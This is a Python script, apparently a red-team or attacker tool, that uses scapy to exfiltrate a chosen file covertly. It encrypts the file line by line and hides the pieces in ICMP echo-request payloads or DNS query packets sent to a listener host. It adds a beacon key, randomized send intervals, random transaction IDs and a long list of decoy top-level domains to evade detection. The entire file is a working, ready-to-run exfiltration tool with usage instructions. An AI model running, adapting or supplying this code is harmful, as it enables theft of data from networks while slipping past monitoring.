#!/usr/bin/python
# An ICMP/DNS data exfiltrating script that starts exfil by sending info to be interpreted by listener script
# This includes: randomly generated encryption key, file name, beacon key (password) and exfil mode (dns/icmp)
# The script then encrypts the desired file line by line and sends each
# The listener script will decrypt data and write to file of the same name
# Listener will close file and finishing when beacon key is received again

import os
import sys
import time
import random
import string
import base64
from smaz import compress
from simplecrypt import encrypt
from scapy.all import *

dnstlds = ["aaa",".abarth",".abb",".abbott",".abbvie",".abc",".able",".abogado",".abudhabi",".ac",".academy",".accenture",
".accountant",".accountants",".aco",".active",".actor",".ad",".adac",".ads",".adult",".ae",".aeg",".aero",".aetna",".af",".afamilycompany",
".afl",".africa",".ag",".agakhan",".agency",".ai",".aig",".aigo",".airbus",".airforce",".airtel",".akdn",".al",".alfaromeo",".alibaba",
".alipay",".allfinanz",".allstate",".ally",".alsace",".alstom",".am",".americanexpress",".americanfamily",".amex",".amfam",".amica",".amsterdam",
".analytics",".android",".anquan",".anz",".ao",".aol",".apartments",".app",".apple",".aq",".aquarelle",".ar",".arab",".aramco",".archi",".army",
".arpa",".art",".arte",".as",".asda",".asia",".associates",".at",".athleta",".attorney",".au",".auction",".audi",".audible",".audio",".auspost",
".author",".auto",".autos",".avianca",".aw",".aws",".ax",".axa",".az",".azure",".ba",".baby",".baidu",".banamex",".bananarepublic",".band",
".bank",".bar",".barcelona",".barclaycard",".barclays",".barefoot",".bargains",".baseball",".basketball",".bauhaus",".bayern",".bb",
".bbt",".bbva",".bcg",".bcn",".bd",".be",".beats",".beauty",".beer",".bentley",".berlin",".best",".bestbuy",".bet",".bf",".bg",".bh",
".bharti",".bi",".bible",".bid",".bike",".bing",".bingo",".bio",".biz",".bj",".black",".blackfriday",".blanco",".blockbuster",".blog",
".bloomberg",".blue",".bm",".bms",".bmw",".bn",".bnl",".bnpparibas",".bo",".boats",".boehringer",".bofa",".bom",".bond",".boo",".book",
".booking",".bosch",".bostik",".boston",".bot",".boutique",".box",".br",".bradesco",".bridgestone",".broadway",".broker",".brother",".brussels",
".bs",".bt",".budapest",".bugatti",".build",".builders",".business",".buy",".buzz",".bv",".bw",".by",".bz",".bzh",".ca",".cab",".cafe",".cal",
".call",".calvinklein",".cam",".camera",".camp",".cancerresearch",".canon",".capetown",".capital",".capitalone",".car",".caravan",".cards",".care",
".christmas",".chrome",".chrysler",".church",".ci",".cipriani",".circle",".cisco",".citadel",".citi",".citic",".city",".cityeats",".ck",
".cl",".claims",".cleaning",".click",".clinic",".clinique",".clothing",".cloud",".club",".clubmed",".cm",".coach",".codes",
".coffee",".college",".cologne",".comcast",".commbank",".community",".company",".compare",".computer",".comsec",".condos",".construction",
".consulting",".contact",".contractors",".cooking",".cookingchannel",".cool",".coop",".corsica",".country",".coupon",".coupons",".courses",".cr",
".credit",".creditcard",".creditunion",".cricket",".crown",".crs",".cruise",".cruises",".csc",".cu",".cuisinella",".cv",".cw",".cx",".cy",
".cymru",".cyou",".cz",".dabur",".dad",".dance",".data",".date",".dating",".datsun",".day",".dclk",".dds",".de",".deal",".dealer",".deals",
".degree",".delivery",".dell",".deloitte",".delta",".democrat",".dental",".dentist",".desi",".design",".dev",".dhl",".diamonds",".diet",".digital",
".direct",".directory",".discount",".discover",".dish",".diy",".dj",".dk",".dm",".dnp",".do",".docs",".doctor",".dodge",".dog",".doha",".domains",
".dot",".download",".drive",".dtv",".dubai",".duck",".dunlop",".duns",".dupont",".durban",".dvag",".dvr",".dz",".earth",".eat",".ec",".eco",".edeka",
".edu",".education",".ee",".eg",".email",".emerck",".energy",".engineer",".engineering",".enterprises",".epost",".epson",".equipment",".er",".ericsson",
".erni",".es",".esq",".estate",".esurance",".et",".etisalat",".eu",".eurovision",".eus",".events",".everbank",".exchange",".expert",".exposed",".express",
".extraspace",".fage",".fail",".fairwinds",".faith",".family",".fan",".fans",".farm",".farmers",".fashion",".fast",".fedex",".feedback",".ferrari",
".ferrero",".fi",".fiat",".fidelity",".fido",".film",".final",".finance",".financial",".fire",".firestone",".firmdale",".fish",".fishing",".fit",
".fitness",".fj",".fk",".flickr",".flights",".flir",".florist",".flowers",".fly",".fm",".fo",".foo",".food",".foodnetwork",".football",".ford",
".forex",".forsale",".forum",".foundation",".fox",".fr",".free",".fresenius",".frl",".frogans",".frontdoor",".frontier",".ftr",".fujitsu",".fujixerox",
".fun",".fund",".furniture",".futbol",".fyi",".ga",".gal",".gallery",".gallo",".gallup",".game",".games",".gap",".garden",".gb",".gbiz",".gd",".gdn",
".ge",".gea",".gent",".genting",".george",".gf",".gg",".ggee",".gh",".gi",".gift",".gifts",".gives",".giving",".gl",".glade",".glass",".gle",
".global",".globo",".gm",".gmail",".gmbh",".gmo",".gmx",".gn",".godaddy",".gold",".goldpoint",".golf",".goo",".goodhands",".goodyear",
".google",".gop",".got",".gp",".gq",".gr",".grainger",".graphics",".gratis",".green",".gripe",".grocery",".group",".gs",".gt",".gu",
".guardian",".gucci",".guge",".guide",".guitars",".guru",".gw",".gy",".hair",".hamburg",".hangout",".haus",".hbo",".hdfc",".hdfcbank",".health",
".healthcare",".help",".helsinki",".here",".hermes",".hgtv",".hiphop",".hisamitsu",".hitachi",".hiv",".hk",".hkt",".hm",".hn",".hockey",".holdings",
".holiday",".homedepot",".homegoods",".homes",".homesense",".honda",".honeywell",".horse",".hospital",".host",".hosting",".hot",".hoteles",".hotels",
".hotmail",".house",".how",".hr",".hsbc",".ht",".hu",".hughes",".hyatt",".hyundai",".ibm",".icbc",".ice",".icu",".id",".ie",".ieee",".ifm",".ikano",
".il",".im",".imamat",".imdb",".immo",".immobilien",".in",".industries",".infiniti",".info",".ing",".ink",".institute",".insurance",".insure",".int",
".intel",".international",".intuit",".investments",".io",".ipiranga",".iq",".ir",".irish",".is",".iselect",".ismaili",".ist",".istanbul",".itau",
".itv",".iveco",".iwc",".jaguar",".java",".jcb",".jcp",".je",".jeep",".jetzt",".jewelry",".jio",".jlc",".jll",".jm",".jmp",".jnj",".jo",".jobs",
".joburg",".jot",".joy",".jp",".jpmorgan",".jprs",".juegos",".juniper",".kaufen",".kddi",".ke",".kerryhotels",".kerrylogistics",".kerryproperties",
".kfh",".kg",".kh",".ki",".kia",".kim",".kinder",".kindle",".kitchen",".kiwi",".km",".kn",".koeln",".komatsu",".kosher",".kp",".kpmg",".kpn",".kr",
".krd",".kred",".kuokgroup",".kw",".ky",".kyoto",".kz",".la",".lacaixa",".ladbrokes",".lamborghini",".lamer",".lancaster",".lancia",".lancome",".land",
".landrover",".lanxess",".lasalle",".lat",".latino",".latrobe",".law",".lawyer",".lb",".lc",".lds",".lease",".leclerc",".lefrak",".legal",".lego",
".lexus",".lgbt",".li",".liaison",".lidl",".life",".lifeinsurance",".lifestyle",".lighting",".like",".lilly",".limited",".limo",".lincoln",".linde",
".link",".lipsy",".live",".living",".lixil",".lk",".llc",".loan",".loans",".locker",".locus",".loft",".lol",".london",".lotte",".lotto",".love",
".lpl",".lplfinancial",".lr",".ls",".lt",".ltd",".ltda",".lu",".lundbeck",".lupin",".luxe",".luxury",".lv",".ly",".ma",".macys",".madrid",".maif",
".maison",".makeup",".man",".management",".mango",".map",".market",".marketing",".markets",".marriott",".marshalls",".maserati",".mattel",".mba",".mc",
".mckinsey",".md",".me",".med",".media",".meet",".melbourne",".meme",".memorial",".men",".menu",".meo",".merckmsd",".metlife",".mg",".mh",".miami",
".microsoft",".mil",".mini",".mint",".mit",".mitsubishi",".mk",".ml",".mlb",".mls",".mm",".mma",".mn",".mo",".mobi",".mobile",".mobily",".moda",
".moe",".moi",".mom",".monash",".money",".monster",".mopar",".mormon",".mortgage",".moscow",".moto",".motorcycles",".mov",".movie",".movistar",".mp",
".mq",".mr",".ms",".msd",".mt",".mtn",".mtr",".mu",".museum",".mutual",".mv",".mw",".mx",".my",".mz",".na",".nab",".nadex",".nagoya",".name",
".nationwide",".natura",".navy",".nba",".nc",".ne",".nec",".net",".netbank",".netflix",".network",".neustar",".new",".newholland",".news",".next",
".nextdirect",".nexus",".nf",".nfl",".ng",".ngo",".nhk",".ni",".nico",".nike",".nikon",".ninja",".nissan",".nissay",".nl",".no",".nokia",
".northwesternmutual",".norton",".now",".nowruz",".nowtv",".np",".nr",".nra",".nrw",".ntt",".nu",".nyc",".nz",".obi",".observer",".off",
".office",".okinawa",".olayan",".olayangroup",".oldnavy",".ollo",".om",".omega",".one",".ong",".onl",".online",".onyourside",".ooo",".open",
".oracle",".orange",".org",".organic",".origins",".osaka",".otsuka",".ott",".ovh",".pa",".page",".panasonic",".panerai",".paris",".pars",
".partners",".parts",".party",".passagens",".pay",".pccw",".pe",".pet",".pf",".pfizer",".pg",".ph",".pharmacy",".phd",".philips",".phone",
".photo",".photography",".photos",".physio",".piaget",".pics",".pictet",".pictures",".pid",".pin",".ping",".pink",".pioneer",".pizza",".pk",
".pl",".place",".play",".playstation",".plumbing",".plus",".pm",".pn",".pnc",".pohl",".poker",".politie",".porn",".post",".pr",".pramerica",
".praxi",".press",".prime",".pro",".prod",".productions",".prof",".progressive",".promo",".properties",".property",".protection",".pru",".prudential",
".ps",".pt",".pub",".pw",".pwc",".py",".qa",".qpon",".quebec",".quest",".qvc",".racing",".radio",".raid",".re",".read",".realestate",".realtor",
".realty",".recipes",".red",".redstone",".redumbrella",".rehab",".reise",".reisen",".reit",".reliance",".ren",".rent",".rentals",".repair",
".report",".republican",".rest",".restaurant",".review",".reviews",".rexroth",".rich",".richardli",".ricoh",".rightathome",".ril",".rio",
".rip",".rmit",".ro",".rocher",".rocks",".rodeo",".rogers",".room",".rs",".rsvp",".rugby",".ruhr",".run",".rw",".rwe",".ryukyu",
".sa",".saarland",".safe",".safety",".sakura",".sale",".salon",".samsclub",".samsung",".sandvik",".sandvikcoromant",".sanofi",".sap",
".sapo",".sarl",".sas",".save",".saxo",".sb",".sbi",".sbs",".sc",".sca",".scb",".schaeffler",".schmidt",".scholarships",".school",
".schule",".schwarz",".science",".scjohnson",".scor",".scot",".sd",".se",".search",".seat",".secure",".security",".seek",".select",".sener",
".services",".ses",".seven",".sew",".sex",".sexy",".sfr",".sg",".sh",".shangrila",".sharp",".shaw",".shell",".shia",".shiksha",".shoes",
".shop",".shopping",".shouji",".show",".showtime",".shriram",".si",".silk",".sina",".singles",".site",".sj",".sk",".ski",".skin",".sky",".skype",
".tienda",".tiffany",".tips",".tires",".tirol",".tj",".tjmaxx",".tjx",".tk",".tkmaxx",".tl",".tm",".tmall",".tn",".to",".today",".tokyo",
".tools",".top",".toray",".toshiba",".total",".tours",".town",".toyota",".toys",".tr",".trade",".trading",".training",".travel",".travelchannel",
".travelers",".travelersinsurance",".trust",".trv",".tt",".tube",".tui",".tunes",".tushu",".tv",".tvs",".tw",".tz",".ua",".ubank",".ubs",".uconnect",
".ug",".uk",".unicom",".university",".uno",".uol",".ups",".us",".uy",".uz",".va",".vacations",".vana",".vanguard",".vc",".ve",".vegas",".ventures",
".verisign",".versicherung",".vet",".vg",".vi",".viajes",".video",".vig",".viking",".villas",".vin",".vip",".virgin",".visa",".vision",".vista",
".vistaprint",".viva",".vivo",".vlaanderen",".vn",".vodka",".volkswagen",".volvo",".vote",".voting",".voto",".voyage",".vu",".vuelos",".wales",
".walmart",".walter",".wang",".wanggou",".warman",".watch",".watches",".weather",".weatherchannel",".webcam",".weber",".website",".wed",".wedding",
".weibo",".weir",".wf",".whoswho",".wien",".wiki",".williamhill",".win",".windows",".wine",".winners",".wme",".wolterskluwer",".woodside",".work",
".works",".world",".wow",".ws",".wtc",".wtf",".xbox",".xerox",".xfinity",".xihuan",".xin",".xperia",".xxx",".xyz",".yachts",".yahoo",".yamaxun",
".yandex",".ye",".yodobashi",".yoga",".yokohama",".you",".youtube",".yt",".yun",".za",".zappos",".zara",".zero",".zippo",".zm",".zone",".zuerich",".zw"]

# Print usage in the case of exception or insufficient arguments
def usage():
	print("[!] SET-UP LISTENER RUNNING ON RECIPIENT IP")
	print("[!] ICMP USAGE: " + sys.argv[0] + " icmp <recipient-ip> <file-name> <beacon-key>")
	print("[!] DNS USAGE: " + sys.argv[0] + " dns <fake-domain> <recipient-ip> <file-name> <beacon-key>")

# Generate 8 byte encryption key for AES
def generatekey():
	key = b''.join([random.choice(string.ascii_letters + string.digits) for n in range(8)])
	key = str(key)
	print("[!] USING ENCRYPTION KEY: " + key)
	return key

# Perform ICMP beacon to initiate exfil with beaconkey and communicate info to listener: filename, mode, encryption key
def icmp_beacon(bk, key, file, target, mode):
	tid = 0x0 + int(("".join(random.choice(string.ascii_uppercase+string.digits+string.punctuation) for _ in range(2))).encode("hex"), 16)
	payload = compress(bk + ":" + key + ":" + mode + ":" + (file.rsplit(dir_struc, 1))[-1])
	packet = (IP(dst=target)/ICMP(type="echo-request",id=tid,seq=1)/payload)
	print("[+] SENDING ENCRYPTION KEY")
	sr(packet, timeout=3, verbose=0)

# Exfiltrate data over ICMP with randomized intervals (17s - 29s)
def icmp_exfil(target, bk, key, file):
	print("[+] BEGINNING EXFIL OVER ICMP")
	tid = 0x0 + int(("".join(random.choice(string.ascii_uppercase+string.digits+string.punctuation) for _ in range(2))).encode("hex"), 16)
	sequence = 1
	with open(file, 'r') as f:
		contents = f.readlines()
		try:
			for line in contents:
				if line == contents[-1]:
					line = line + bk
					encrypted = encrypt(key, line)
					packet = (IP(dst=target)/ICMP(type="echo-request",id=tid,seq=sequence)/encrypted)
					send(packet, verbose=0)
					print("[+] FILE EXFIL COMPLETE")
					sequence = sequence + 1
					time.sleep(random.randint(4,9))
				else:
					encrypted = encrypt(key, line)
					packet = (IP(dst=target)/ICMP(type="echo-request",id=tid,seq=sequence)/encrypted)
					send(packet, verbose=0)
					print("[+] SENDING %s BYTES..." % str(len(encrypted)))
					sequence = sequence + 1
					time.sleep(random.randint(4,9))
		except KeyboardInterrupt:
			icmp_beacon(bk, key, file, target, "i")

# Perform DNS beacon to initiate exfil with beaconkey and communicate info to listener: filename, mode, encryption key
def dns_beacon(bk, key, file, mode, domain, nameserver):
	tld = random.choice(dnstlds)
	tid = 0x0 + int(("".join(random.choice(string.ascii_uppercase+string.digits+string.punctuation) for _ in range(2))).encode("hex"), 16)
	payload = compress(bk + ":" + key + ":" + mode + ":" + (file.rsplit(dir_struc, 1))[-1])
	packet = (IP(dst=nameserver)/UDP(sport=random.randint(1025,65500),dport=53)/DNS(rd=1,id=tid,qd=DNSQR(qname=domain+tld,qtype="CERT")/payload))
	send(packet, verbose=0)

# Exfiltrate data over DNS by breaking up line, encrypting and converting to hex
def dns_exfil(bk, key, file, mode, domain, nameserver):
	print("[+] BEGINNING EXFIL OVER DNS")
	with open(file, 'r') as f:
		contents = f.readlines()
		try:
			for line in contents:
				if line == contents[-1]:
					line = line + bk
					tid = 0x0 + int(("".join(random.choice(string.ascii_uppercase+string.digits+string.punctuation) for _ in range(2))).encode("hex"), 16)
					encrypted = encrypt(key, line)
					tld = random.choice(dnstlds)
					extra = (random.choice(dnstlds)).replace(".","")
					packet = (IP(dst=nameserver)/UDP(sport=random.randint(1025,65500),dport=53)/DNS(rd=1,id=tid,qd=DNSQR(qname=domain+extra+tld,qtype="A")/encrypted))
					send(packet, verbose=0)
					print("[+] FILE EXFIL COMPLETE")
					time.sleep(random.randint(2,3))
				else:
					tid = 0x0 + int(("".join(random.choice(string.ascii_uppercase+string.digits+string.punctuation) for _ in range(2))).encode("hex"), 16)
					encrypted = encrypt(key, line)
					tld = random.choice(dnstlds)
					extra = (random.choice(dnstlds)).replace(".","")
					packet = (IP(dst=nameserver)/UDP(sport=random.randint(1025,65500),dport=53)/DNS(rd=1,id=tid,qd=DNSQR(qname=domain+extra+tld,qtype="A")/encrypted))
					send(packet, verbose=0)
					print("[+] SENDING %s BYTES..." % str(len(encrypted)))
					time.sleep(random.randint(2,3))
		except KeyboardInterrupt:
			dns_beacon(bk, key, file, mode, domain, nameserver)

# Main process execution
def main():
	try:
		mode = string.lower(sys.argv[1])
		if mode == 'icmp':
			mode = "i"
			target = str(sys.argv[2])
			file = str(sys.argv[3])
			bk = str(sys.argv[4])
			print("[+] INITIATING ICMP DATA EXFIL")
			key = generatekey()
			icmp_beacon(bk, key, file, target, mode)
			icmp_exfil(target, bk, key, file)
		elif mode == 'dns':
			mode = "d"
			domain = str(sys.argv[2])
			nameserver = str(sys.argv[3])
			file = str(sys.argv[4])
			bk = str(sys.argv[5])
			print("[+] INITIATING DNS DATA EXFIL")
			key = generatekey()
			print("[+] USING ENCRYPTION KEY: " + key)
			dns_beacon(bk, key, file, mode, domain, nameserver)
			dns_exfil(bk, key, file, mode, domain, nameserver)
		else:
			usage()
	except Exception as e:
		print(e)
		usage()

# Before executing main function checks os type for file path structure
if __name__=="__main__":
	if os.name == 'nt':
		dir_struc = "\\"
	else:
		dir_struc = "/"
	main()